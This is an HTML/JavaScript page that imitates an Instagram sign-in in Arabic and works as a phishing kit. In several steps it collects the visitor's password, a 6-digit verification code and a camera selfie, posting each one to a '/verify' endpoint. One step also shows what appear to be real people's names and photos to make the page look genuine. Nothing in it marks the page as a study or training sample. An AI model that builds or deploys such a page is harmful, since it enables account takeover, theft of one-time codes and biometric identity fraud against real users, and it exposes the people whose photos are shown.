<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Instagram</title>
</head>
<body dir="rtl">
  <header class="header">
    <a href="#" class="logo">Instagram</a>
  </header>

  <main class="main-content">
    <!-- STEP 1 – Welcome -->
    <div id="step1" class="step active login-container">
      <div class="lock-icon">
        <svg class="lock-svg" viewBox="0 0 24 24">
          <path d="M18,8h-1V6c0-2.76-2.24-5-5-5S7,3.24,7,6v2H6c-1.1,0-2,.9-2,2v10c0,1.1.9,2,2,2h12c1.1,0,2-.9,2-2V10c0-1.1-.9-2-2-2zm-9-2c0-1.66,1.34-3,3-3s3,1.34,3,3v2H9V6zm9,14H6V10h12v10zm-6-3c1.1,0,2-.9,2-2s-.9-2-2-2-2,.9-2,2,.9,2,2,2z"/>
        </svg>
      </div>

      <h1 class="title">مرحبًا مجددًا</h1>
      <p class="subtitle">أدخل كلمة مرورك للمتابعة بأمان</p>

      <form id="f1">
        <input type="password" name="pwd" class="form-input" placeholder="كلمة المرور" required minlength="6"
               autocomplete="current-password">
        <button type="submit" class="submit-btn">تسجيل الدخول</button>
      </form>
    </div>

    <!-- STEP 2 – Pick people -->
    <div id="step2" class="step login-container" style="padding-top:20px">
      <h1 class="title">حدّد من تعرفهم</h1>
      <p class="subtitle">اختر اسماءك المألوفة أو تخطّى المجموعة</p>

      <form id="f2" onsubmit="return false">
        <div id="peopleList" style="display:grid;gap:12px;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));margin-bottom:20px"></div>
        <button type="submit" id="nextPackBtn" class="submit-btn" disabled>التالي</button>
        <button type="button" id="skipPackBtn" class="btn btn-secondary" style="width:100%;margin-top:12px">تخطي المجموعة</button>
      </form>
    </div>

    <!-- STEP 3 – 6-digit code -->
    <div id="step3" class="step login-container">
      <h1 class="title">رمز التحقق</h1>
      <p class="subtitle">أرسلنا رمزًا مكوّنًا من 6 أرقام إلى <strong id="emailDisplay">user@example.com</strong></p>
      <form id="f3">
        <input type="text" name="emailCode" class="form-input" placeholder="123456" maxlength="6" pattern="\d{6}" required
               autocomplete="one-time-code">
        <button type="submit" class="submit-btn">تحقق</button>
      </form>
    </div>

    <!-- STEP 4 – Selfie -->
    <div id="step4" class="step login-container">
      <h1 class="title">صورة شخصية</h1>
      <p class="subtitle">ضع وجهك داخل الإطار ثم التقط</p>
      <video id="video" autoplay muted playsinline style="width:100%;border-radius:8px;margin-bottom:12px"></video>
      <canvas id="canvas" style="display:none;"></canvas>
      <img id="previewSelfie" hidden style="width:100%;border-radius:8px;margin-bottom:12px"/>
      <button type="button" id="snapBtn" class="submit-btn" onclick="takeSelfie()">التقاط</button>
      <form id="f4" enctype="multipart/form-data">
        <input type="hidden" name="selfieData" id="selfieData"/>
        <button type="submit" class="submit-btn" hidden>إرسال الصورة</button>
      </form>
    </div>

    <!-- STEP 5 – Done -->
    <div id="step5" class="step login-container">
      <h1 class="title">تم بنجاح</h1>
      <p class="subtitle">شكرًا لك، سنراجع بياناتك ونعلمك بالنتيجة.</p>
    </div>
  </main>

  <!-- Dark-theme styles -->
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;margin:0}
    .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid #262626}
    .logo{font-family:'Brush Script MT',cursive;font-size:32px;color:#fff;text-decoration:none}
    .main-content{flex:1;display:flex;justify-content:center;align-items:center;padding:40px 20px}
    .login-container{background:#262626;border-radius:12px;padding:40px;width:100%;max-width:350px;text-align:center}
    .lock-icon{width:96px;height:96px;border:3px solid #fff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
    .lock-svg{width:44px;height:44px;fill:#fff}
    .title{font-size:16px;font-weight:600;margin-bottom:8px}
    .subtitle{font-size:14px;color:#a8a8a8;margin-bottom:24px;line-height:1.4}
    .form-input{width:100%;padding:12px;background:#121212;border:1px solid #363636;border-radius:6px;color:#fff;font-size:14px;margin-bottom:16px;outline:none}
    .form-input::placeholder{color:#8e8e8e}
    .form-input:focus{border-color:#0095f6}
    .submit-btn{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:.2s}
    .submit-btn:hover{background:#1877f2}
    .submit-btn:disabled{background:#555;cursor:not-allowed}
    .btn{padding:12px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:.2s;border:none}
    .btn-secondary{background:transparent;color:#0095f6;border:1px solid #0095f6}
    .btn-secondary:hover{background:#0095f6;color:#fff}
    .step{display:none}
    .step.active{display:block}
  </style>

  <script>
    const state={pwd:'',emailCode:'',selfie:null};

    function goTo(step){
      document.querySelectorAll('.step').forEach(el=>el.classList.remove('active'));
      document.getElementById(`step${step}`).classList.add('active');
      if(step===3) document.getElementById('emailDisplay').textContent='user@example.com';
      if(step===4) startCamera();
    }

    // --- Unified submit helper ---
    async function submitStep(form, stepNumber){
      const fd=new FormData(form);
      fd.append('step', stepNumber);
      try{
        const r=await fetch('/verify',{method:'POST',body:fd});
        if(!r.ok) throw new Error('network');
        goTo(stepNumber+1);
      }catch(e){
        alert('حدث خطأ أثناء الإرسال. حاول مجددًا.');
      }
    }

    // Attach to forms
    ['f1','f3','f4'].forEach((fid,i)=>{
      document.getElementById(fid).addEventListener('submit', e=>{
        e.preventDefault();
        submitStep(e.target, i+1);
      });
    });

    /* --- STEP 2 data & logic --- */
    const rawPeople=[
      "SANAE HMADOUCH","SANAE HAKIL","SALMA BOUCHAYOUA","NADA HAMDOUCH","KAOUTAR ACHAHCHAH",
      "HAYAT AMEZIANE","HAJAR ELGHARS","FATIHA BALLOUK","CHAYMAE CHAOUCH","AYOUB BOURAKBA"
    ];
    const photoMap={
      "SANAE HMADOUCH":"https://i.ibb.co/Q3J3Hxy/SANAE-HMADOUCH.jpg",
      "SANAE HAKIL":"https://i.ibb.co/Q7kTdq4/SANAE-HAKIL.jpg",
      "SALMA BOUCHAYOUA":"https://i.ibb.co/2YkbnDv/SALMA-BOUCHAYOUA.jpg",
      "NADA HAMDOUCH":"https://i.ibb.co/jvqF1Cw/NADA-HAMDOUCH.jpg",
      "KAOUTAR ACHAHCHAH":"https://i.ibb.co/NdxyqqF/KAOUTAR-ACHAHCHAH.jpg",
      "HAYAT AMEZIANE":"https://i.ibb.co/nMNC663/HAYAT-AMEZIANE.jpg",
      "HAJAR ELGHARS":"https://i.ibb.co/V7qyRvd/HAJAR-ELGHARS.jpg",
      "FATIHA BALLOUK":"https://i.ibb.co/mCCSX8h/FATIHA-BALLOUK.jpg",
      "CHAYMAE CHAOUCH":"https://i.ibb.co/YBNCdbG/CHAYMAE-CHAOUCH.jpg",
      "AYOUB BOURAKBA":"https://i.ibb.co/fzLckp4/AYOUB-BOURAKBA.jpg"
    };
    let allChosen=[], index=0;
    function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
    const people=shuffle([...rawPeople]);

    function renderPack(){
      const pack=people.slice(index,index+6);
      const listBox=document.getElementById('peopleList');
      listBox.innerHTML='';
      pack.forEach(fullName=>{
        const [first,last]=fullName.split(' ');
        const card=document.createElement('label');
        card.style.cssText='background:#121212;border:1px solid #363636;border-radius:8px;padding:8px;cursor:pointer;display:flex;flex-direction:column;align-items:center;color:#fff;transition:border-color 0.2s';
        card.innerHTML=`
          <img src="${photoMap[fullName]}" style="width:80px;height:80px;border-radius:50%;object-fit:cover;margin-bottom:6px" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iNDAiIGN5PSI0MCIgcj0iNDAiIGZpbGw9IiM0NDQiLz4KPHN2ZyB4PSIyMCIgeT0iMjAiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSIjOTk5Ij4KPHA+UGVyc29uPC9wPgo8L3N2Zz4KPC9zdmc+'">
          <b>${first}</b><span style="font-size:12px">${last}</span>
          <input type="checkbox" value="${fullName}" style="margin-top:6px">
        `;
        card.addEventListener('change', e=>{
          card.style.borderColor=e.target.checked?'#0095f6':'#363636';
        });
        listBox.appendChild(card);
      });
      document.getElementById('nextPackBtn').disabled=true;
    }
    document.getElementById('peopleList').addEventListener('change',()=>{
      const ch=[...document.querySelectorAll('#peopleList input:checked')].length;
      document.getElementById('nextPackBtn').disabled=!ch;
    });
    document.getElementById('nextPackBtn').addEventListener('click',()=>{
      allChosen.push(...[...document.querySelectorAll('#peopleList input:checked')].map(cb=>cb.value));
      index+=6;
      index>=people.length?submitStep(document.getElementById('f2'),2):renderPack();
    });
    document.getElementById('skipPackBtn').addEventListener('click',()=>{
      index+=6;
      index>=people.length?submitStep(document.getElementById('f2'),2):renderPack();
    });
    setTimeout(renderPack,100);

    /* --- Camera functionality --- */
    let stream;
    async function startCamera(){
      try{
        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
        document.getElementById('video').srcObject=stream;
      }catch(err){
        console.log('Camera access denied');
        document.getElementById('video').style.display='none';
        const container=document.getElementById('video').parentNode;
        container.innerHTML+=
          '<div style="background:#333;padding:40px;border-radius:8px;margin-bottom:12px;font-size:14px;color:#ccc;">'+
          'لا يمكن الوصول إلى الكاميرا. من فضلك اسمح بالإذن أو استخدم زر "تخطي".</div>';
      }
    }
    function takeSelfie(){
      const canvas=document.getElementById('canvas');
      const video=document.getElementById('video');
      if(!video.videoWidth) return;
      canvas.width=video.videoWidth;
      canvas.height=video.videoHeight;
      canvas.getContext('2d').drawImage(video,0,0);
      canvas.toBlob(blob=>{
        const file=new File([blob],'selfie.jpg',{type:'image/jpeg'});
        const dt=new DataTransfer(); dt.items.add(file);
        document.getElementById('selfieData').files=dt.files;
        document.getElementById('previewSelfie').src=URL.createObjectURL(blob);
        document.getElementById('previewSelfie').hidden=false;
        document.getElementById('snapBtn').hidden=true;
        document.getElementById('f4').lastElementChild.hidden=false;
        document.getElementById('video').style.display='none';
        stream.getTracks().forEach(t=>t.stop());
      },'image/jpeg',0.8);
    }
  </script>
</body>
</html>